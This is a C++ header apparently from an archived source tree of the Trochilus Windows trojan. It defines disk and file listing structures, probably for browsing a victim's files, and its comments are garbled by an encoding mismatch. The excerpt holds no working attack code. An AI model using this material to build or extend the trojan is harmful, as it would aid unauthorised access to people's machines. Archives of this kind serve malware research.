/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include <vector>

//�������ݽṹ
typedef struct  
{
	CHAR	partition;
	UINT	driverType;
	UINT64	freeBytes;
	UINT64	totalBytes;
} RDISK_INFO;
typedef std::vector<RDISK_INFO> DiskInfoList;

//�ļ����ݽṹ
typedef struct RFILE_INFO
{
	WCHAR		filename[MAX_PATH];
	DWORD		dwAttributes;
	UINT64		filesize;
	FILETIME	lastWriteTime;

	BOOL IsDir() const
	{
		return (FILE_ATTRIBUTE_DIRECTORY & dwAttributes);
	}

	bool operator<(const RFILE_INFO& another) const
	{
		if (! IsDir() && another.IsDir()) return false;
		else if (IsDir() && ! another.IsDir()) return true;
		else
		{
			int iCmp = _wcsicmp(filename, another.filename);
			if (iCmp < 0) return true;
			else return false;
		}
	}
} RFILE_INFO;
typedef std::vector<RFILE_INFO> FileInfoList;
